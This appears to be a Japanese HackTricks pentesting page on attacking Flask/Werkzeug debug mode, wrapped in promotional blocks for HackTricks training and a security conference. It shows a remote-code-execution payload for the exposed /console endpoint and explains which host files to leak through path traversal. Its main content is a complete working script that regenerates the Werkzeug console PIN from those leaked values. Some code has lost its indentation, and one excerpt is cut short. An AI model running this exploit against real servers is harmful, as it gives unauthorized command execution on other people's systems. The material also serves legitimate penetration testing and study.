# Werkzeug / Flask デバッグ

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conferenceは、国際的なサイバーセキュリティイベント**](https://www.dragonjarcon.org/)で、10年以上の歴史を持ち、2023年9月7日と8日にコロンビアのボゴタで開催されます。技術的な内容が豊富なイベントで、最新の研究がスペイン語で発表され、世界中のハッカーや研究者を引き付けます。
以下のリンクから今すぐ登録し、この素晴らしいカンファレンスをお見逃しなく！:

{% embed url="https://www.dragonjarcon.org" %}

## コンソールRCE

デバッグが有効な場合、`/console`にアクセスしてRCEを獲得することができます。
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

インターネット上には、[このような](https://github.com/its-arun/Werkzeug-Debug-RCE)エクスプロイトや、metasploitにあるものがいくつかあります。

## ピン保護 - パストラバーサル

場合によっては、**`/console`** エンドポイントがピンで保護されていることがあります。**ファイルトラバーサルの脆弱性**があれば、そのピンを生成するために必要な情報をすべて漏洩させることができます。

### Werkzeug コンソール PIN エクスプロイト

**最初のリンクからコピーしました。**\
アプリでデバッグエラーページを強制することにより、Werkzeugの「コンソールロック」メッセージを表示します。
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
脆弱なWerkzeugデバッグコンソールをパス `vulnerable-site.com/console` で見つけますが、秘密のPIN番号でロックされています。

コンソールPINを生成するアルゴリズムを逆にすることができます。サーバー上のWerkzeugのデバッグ `__init__.py` ファイルを調べます。例：`python3.5/site-packages/werkzeug/debug/__init__.py`。[**Werkzeugソースコードリポジトリ**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) **を確認してPINがどのように生成されるかをチェックすることができます**が、バージョンが異なる可能性が高いので、**ファイルトラバーサルの脆弱性**を通じてソースコードをリークする方が良いでしょう。

コンソールPINを悪用するために必要な変数：
```python
probably_public_bits = [
username,
modname,
getattr(app, '__name__', getattr(app.__class__, '__name__')),
getattr(mod, '__file__', None),
]

private_bits = [
str(uuid.getnode()),
get_machine_id(),
]
```
#### **`probably_public_bits`**

* **`username`** はこのFlaskを開始したユーザーです
* **`modname`** は flask.app です
* `getattr(app, '__name__', getattr(app.__class__, '__name__'))` は **Flask** です
* `getattr(mod, '__file__', None)` は flaskディレクトリ内の**`app.py`の絶対パス**です（例：`/usr/local/lib/python3.5/dist-packages/flask/app.py`）。もし `app.py` が機能しない場合は、**`app.pyc`を試してください**

#### `private_bits`

*   `uuid.getnode()` は **現在のコンピュータのMACアドレス**で、`str(uuid.getnode())` はMACアドレスの10進数表現です。

* **サーバーのMACアドレスを見つける**には、アプリを提供している**使用中のネットワークインターフェース**が何かを知る必要があります（例：`ens3`）。不明な場合は、デバイスIDのために **`/proc/net/arp`をリーク**し、その後**`/sys/class/net/<device id>/address`で** MACアドレスを**リーク**します。

**16進数アドレスから10進数**表現に変換するには、例えばpythonで以下を実行します：

```python
# それは 56:00:02:7a:23:ac でした
>>> print(0x5600027a23ac)
94558041547692
```
* `get_machine_id()` は **`/etc/machine-id`** または **`/proc/sys/kernel/random/boot_id`** の値を、最後のスラッシュ（`/`）の後の **`/proc/self/cgroup`の最初の行**と結合します。

<details>

<summary>get_machine_id() コード</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

すべての変数が準備されたら、WerkzeugコンソールPINを生成するためのexploitスクリプトを実行します:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',# username
'flask.app',# modname
'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
{% hint style="success" %}
**古いバージョン**のWerkzeugを使用している場合は、ハッシュアルゴリズムをsha1から**md5に変更して**みてください。
{% endhint %}

## 参考文献

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference es un evento internacional de ciberseguridad**](https://www.dragonjarcon.org/) は、2023年9月7日と8日にコロンビアのボゴタで開催される10年以上の歴史を持つ国際的なサイバーセキュリティイベントです。技術的な内容が豊富で、世界中のハッカーや研究者を惹きつける最新の研究がスペイン語で発表されます。
以下のリンクから今すぐ登録し、この素晴らしいカンファレンスをお見逃しなく！:

{% embed url="https://www.dragonjarcon.org" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**Twitterでフォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>
